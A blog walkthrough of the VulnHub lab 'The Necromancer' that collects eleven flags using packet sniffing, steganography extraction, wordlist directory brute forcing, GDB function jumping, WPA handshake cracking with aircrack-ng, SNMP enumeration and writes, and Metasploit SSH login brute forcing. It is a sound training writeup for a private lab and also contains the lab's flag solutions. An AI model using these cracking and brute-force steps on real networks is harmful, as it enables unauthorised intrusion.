---
layout: post
title: "Destroy The Necromancer"
date: 2018-06-09 06:02:55 -0400
comments: true
categories: [penetration testing, writeups]
keywords: the necromancer, the necromancer vulnhub, the necromancer walkthrough, the necromacer writeup, necromancer, vulnhub, pentest lab, hacking lab, ctf, snmp-check, snmp, snmp enum, aircrack-ng, snmpwalk, cewl
description: The Necromancer writeup
---

Today's challenge is a boot2root with 11 flags to collect.

<!-- more -->

The Nmap scan took really long and found nothing:

``` 
Nmap scan report for 192.168.217.142
Host is up (0.00023s latency).
All 65535 scanned ports on 192.168.217.142 are filtered
MAC Address: 00:0C:29:3B:03:B5 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 192.168.217.142

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1336.70 seconds
```

Then I tried an UDP scan, but only got 1 hit:

``` 
PORT    STATE SERVICE
666/udp open  doom
```

I tried connecting to it with netcat, but other than a message, I didn't find anything:

``` 
nc -vnu 192.168.217.142 666
(UNKNOWN) [192.168.217.142] 666 (?) open

You gasp for air! Time is running out!

You gasp for air! Time is running out!
```

# Flag #1 - Sniffing network traffic

With nothing else to go with, I started sniffing the local traffic and looked if the Necromancer is sending anything across the network:

{% img center /images/pentest/necromancer/capture.PNG 'capture' 'Wireshark capture' %}

The machine is trying to establish TCP connections (SYN flag) to different IPs, on port 4444. So what happens if we listen on that port on our attacker machine?

``` 
root@kali:~# nc -vnlp 4444
listening on [any] 4444 ...
connect to [192.168.223.129] from (UNKNOWN) [192.168.223.128] 25759
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...
```

We received a string! I used an online Base64 decoder to decipher this:

``` 
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

An MD5 hash..I decoded it and moved on.

Flag #1: **opensesame**

# Flag #2 - Chanting the string

In the previous message, we have a hint for the 2nd flag. Now we've decoded the 1st flag, so we need to send it..where? To its doom! Remember the UDP port 666 we discovered earlier:

``` 
root@kali:~# nc -vnu 192.168.223.128 666
(UNKNOWN) [192.168.223.128] 666 (?) open
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

Another flag, another hash. Flag #2: **1033750779**

# Flag #3 - A pile of feathers

The hint mentioned the number 80, so I used my browser to navigate to it and ended up in The Chasm.

{% img center /images/pentest/necromancer/chasm.png 'the chasm' 'The Chasm' %}

I've downloaded the image, pileoffeathers.jpg, and ran it through exiftool, with no discoveries. Then I ran strings on it and saw a couple of mentions about a file called *feathers.txt*. I thought that a text file must be hidden in the image. so I looked for ways to extract it. Kali comes pre-equipped with just the right tool:

> binwalk  - tool for searching binary images for embedded files and executable code

``` 
binwalk -e pileoffeathers.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive
```

The files were extracted in a directory called _pileoffeathers.jpg.extracted. Inside I found the feathers.txt file in a ZIP archive called 9082.zip.

``` 
cat feathers.txt 
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
```

Another Base64 string. Decoded it to find the flag and the hint:

``` 
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at 
/amagicbridgeappearsatthechasm
```

Flag #3: **345465869**

# Flag #4 - Talisman

On the web server, I went to the path of the above magic bridge, that leads to the cave:

{% img center /images/pentest/necromancer/cave.png 'cave' 'cave entrance' %}

Another image, this time it's a magicbook.jpg. But with all the usual tools I've tried, I couldn't find any hidden information. I went back to the webpage and started bruteforcing for files and directories with different wordlists, and found nothing. Back to the drawing board..the hint is *There must be a magical item that could protect you from the necromancer's spell.*. After looking on the interwebz for a bit, I went the route of building a custom dictionary of magical items to use with dirb. I used cewl to build a list from the words on https://dnd5e.info/magic-items/alphabetical-magic-item-list

``` 
cewl https://dnd5e.info/magic-items/alphabetical-magic-item-list -w magicitems.txt
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated
```

The wordlist has over 9k entries:

``` 
wc -l magicitems.txt 
9315 magicitems.txt
```

Back to dirb, and this time it found something!

``` 
dirb http://192.168.223.128/amagicbridgeappearsatthechasm/ /root/Downloads/magicitems.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun  9 09:08:18 2018
URL_BASE: http://192.168.223.128/amagicbridgeappearsatthechasm/
WORDLIST_FILES: /root/Downloads/magicitems.txt

-----------------

GENERATED WORDS: 9315                                                          

---- Scanning URL: http://192.168.223.128/amagicbridgeappearsatthechasm/ ----
+ http://192.168.223.128/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)
                                                                               
-----------------
END_TIME: Sat Jun  9 09:08:37 2018
DOWNLOADED: 9315 - FOUND: 1
```

A talisman! Going to the path leads to a binary called talisman. But running it doesn't produce the effect I'd hoped:

``` 
./talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  y

Nothing happens.
```

I fired up GDB, set a breakpoint on main and ran the executable again. 

``` 
Breakpoint 1, 0x08048a21 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x08048a13 <+0>:	lea    0x4(%esp),%ecx
   0x08048a17 <+4>:	and    $0xfffffff0,%esp
   0x08048a1a <+7>:	pushl  -0x4(%ecx)
   0x08048a1d <+10>:	push   %ebp
   0x08048a1e <+11>:	mov    %esp,%ebp
   0x08048a20 <+13>:	push   %ecx
=> 0x08048a21 <+14>:	sub    $0x4,%esp
   0x08048a24 <+17>:	call   0x8048529 <wearTalisman>
   0x08048a29 <+22>:	mov    $0x0,%eax
   0x08048a2e <+27>:	add    $0x4,%esp
   0x08048a31 <+30>:	pop    %ecx
   0x08048a32 <+31>:	pop    %ebp
   0x08048a33 <+32>:	lea    -0x4(%ecx),%esp
   0x08048a36 <+35>:	ret    
```

There is a wearTalisman function that is about to be called. Must be what we've seen when running the binary. I set up another breakpoint on this function and disassembled it, but I could see nothing interesting. Then I looked what other functions there might be in the binary:

``` 
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d0  _init
0x08048310  printf@plt
0x08048320  __libc_start_main@plt
0x08048330  __isoc99_scanf@plt
0x08048350  _start
0x08048380  __x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  __do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  __libc_csu_init
0x08049590  __libc_csu_fini
0x08049594  _fini
0xf7fd6a30  _dl_catch_exception@plt
```

A function named chantToBreakSpell sounds exactly like what we need! And it wasn't called from main or wearTalisman. So I jumped directly to it:

``` 
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 3652) exited with code 0102]
```

The talisman worked! Flag #4: **blackmagic**

# Flag #5 - Black magic

Like before, I've tried sending the string, this time to UDP 31337, but:

``` 
nc -vnu 192.168.223.128 31337
(UNKNOWN) [192.168.223.128] 31337 (?) open
bNothing happens.
lNothing happens.
aNothing happens.
cNothing happens.
kNothing happens.
mNothing happens.
aNothing happens.
gNothing happens.
iNothing happens.
cNothing happens.
```

So I tried a different method of sending the string by piping it to netcat and it worked:

``` 
echo blackmagic | nc -u 192.168.223.128 31337


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

Flag #5: **809472671**

# Flag #6 - Necromancer

Went to the new path and found the necromancer and a flag!

{% img center /images/pentest/necromancer/necromancer-fullpage.png 'necromancer' 'necromancer' %}

Flag #6: **1756462165**

# Flag #7 - Not your average SNMP walk

The necromancer link points to another binary, but when I tried to run it I got an error:

``` 
./necromancer 
bash: ./necromancer: cannot execute binary file: Exec format error
```

This file is not an executable:

``` 
file necromancer
necromancer: bzip2 compressed data, block size = 900k
```

From it I've extracted a packet capture file:

``` 
tar xjvf necromancer
necromancer.cap
```

The file contains wireless traffic and references an SSID called community. It also captured deauthentication and association packets. If it captured a WPA handshake, we can try to crack it with aircrack-ng!

``` 
aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt 
Opening necromancer.cap
Read 2197 packets.

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)

Choosing first network as target.

Opening necromancer.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 

      [00:00:13] 16084/9822768 keys tested (1369.50 k/s) 

      Time left: 1 hour, 59 minutes, 23 seconds                  0.16%

                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
```

Boom! It didn't take long at all. The key is death2all. What to do with it? The hint on the webpage mentioned u161, so we're looking at SNMP next. I selected **snmp-check** for the job of enumerating SNMP:

> snmp-check allows you to enumerate the SNMP devices and places the output in a very 
> human readable friendly format. It could  be  useful  for penetration testing or 
> systems monitoring.

Used the cracked key as community string and got the following info:

``` 
snmp-check -c death2all 192.168.223.128
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.223.128:161 using SNMPv1 and community 'death2all'

[*] System information:

  Host IP address               : 192.168.223.128
  Hostname                      : Fear the Necromancer!
  Description                   : You stand in front of a door.
  Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
  Location                      : Locked - death2allrw!
  Uptime snmp                   : -
  Uptime system                 : -
  System date                   : -
```

Now it looks that we also have a read/write community string. But still not sure where to use it, so I turned to another SNMP utility, **snmpwalk**

> snmpwalk  -  retrieve a subtree of management values using SNMP GETNEXT requests

``` 
snmpwalk -v 1 -c death2allrw 192.168.223.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (2199606) 6:06:36.06
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
```

The output is massive, but I only kept the relevant part. The important line is this one: <code>iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"</code>. So if we could change it to Unlocked, maybe something would happen? The next tool coming into play is **snmpset**

> snmpset  is  an  SNMP application that uses the SNMP SET request to set
> information on a network entity.  One or more object identifiers (OIDs)
> must  be given as arguments on the command line.  A type and a value to
> be set must accompany each object identifier. 

``` 
snmpset -v 1 -c death2allrw 192.168.223.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
```

We set the string for the iso.3.6.1.2.1.1.6.0 OID to Unlocked. Now let's walk again:

``` 
snmpwalk -v 1 -c death2allrw 192.168.223.128
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
iso.3.6.1.2.1.1.3.0 = Timeticks: (2263758) 6:17:17.58
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
```

With the door unlocked, we have the flag and next destination..SSH!

Flag #7: **demonslayer**

# Flag #8 - demonslayer

The SSH on the machine is accepting password logins, so it's time for the bruteforce approach. I've used the combination of demonslayer as username and rockyou.txt as wordlist.

``` 
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.223.128:22 - Success: 'demonslayer:12345678' 'uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer) OpenBSD thenecromancer 5.9 GENERIC#1761 amd64 '
[*] Command shell session 1 opened (192.168.223.129:43627 -> 192.168.223.128:22) at 2018-06-09 14:41:25 -0400
```

We've found the password is *12345678* and have a shell on the box:

``` 
msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...

whoami
demonslayer
pwd
/home/demonslayer
ls -alh
total 40
drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
-rw-r--r--  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
-rw-r--r--  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
-rw-r--r--  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
-rw-r--r--  1 demonslayer  demonslayer   359B May 11  2016 .login
-rw-r--r--  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
-rw-r--r--  1 demonslayer  demonslayer   218B May 11  2016 .profile
drwx------  2 demonslayer  demonslayer   512B May 11  2016 .ssh
-rw-r--r--  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt
```

Let's read that flag:

``` 
cat flag8.txt
You enter the Necromancer's Lair!

A stench of decay fills this place.  

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.  

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!" 

Defend yourself!  Counter attack the Necromancer's spells at u777!
```

I've tried connecting to UDP 777, but nothing happened. So I tried next to connect to the local host from within the SSH shell. Netcat wasn't installed, but nc was:

``` 
nc -u localhost 777




** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  
```

The battle is on! Seems we have to answer correctly, so I googled and found this on [this Wikipedia page](https://en.wikipedia.org/wiki/Tsurani):

> Great Ones, or Black Robes, are magicians on Kelewan who practice magic of the Greater
> Path.

Passing Kelewan as the answer reveals the 8th flag, which is the same as the answer:

``` 
Where do the Black Robes practice magic of the Greater Path?  Kelewan


flag8{55a6af2ca3fee9f2fef81d20743bda2c}
```

Flag #8: **Kelewan**

# Flag #9 - Lord of the 8th plane of hell

``` 
** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?  
```

Next quesch! I'm proud to say I didn't need to google for this one :D 

``` 
Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}
```

The legend of Faust is well-known to me, and since you're reading this, I have to point you to 2 epic albums of Kamelot that are inspired by Faust: Epica and The Black Halo. You will thank me later.

Mephistopheles is also the demonlord of the 8th plane of hell in Neverwinter Nights: Hordes of the Underdark. Clearly I'm having a nostalgic moment here!

Flag #9: **Mephistopheles**

# Flag #10 - The Ninth Gate

``` 
** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?  
```

Back to Google for this one and found the answer [here](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters):

> Hedge is a necromancer in service of Orannis, who supplies Nicholas Sayre (in mistake 
> for Prince Sameth) as the latter's avatar. He is roughly 100 years old. Motivated by an
> all-consuming desire for immortality, he believes that if he frees Orannis, he will 
> become viceroy over the Dead; but fails when tricked into passing the Ninth Gate.

``` 
Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.
```

Flag #10: **Hedge**

# Flag #11 - The elixir of power

A small vile on the ground..a hidden .smallvile file in demonslayer's home!

``` 
$ cat .smallvile


You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!
```

Immediately I thought of root privileges and looked at the sudo rights:

``` 
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
```

User demonslayer can read the 11th flag in root's home folder. Let's see the ending:

``` 
$ sudo /bin/cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="
```

Flag #11: **hackergod**

The necromancer is down! This was a really fun one, with a lot of challenge diversity and that text-based RPG feel and fantasy mentions! Thanks to xerubus for putting us face to face with the necromancer!

Some special fortune cookie:

``` 
 _________________________________________
/ M: Last I knew, I thought I had trapped \
| you for all eternity in an icy little   |
| place called Cania                      |
|                                         |
| H: Sorry, Hell froze over.              |
|                                         |
| M: How very witty. But it takes more    |
| than sharp wit to rule Hell, little     |
\ one. You must also...dress the part.    /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

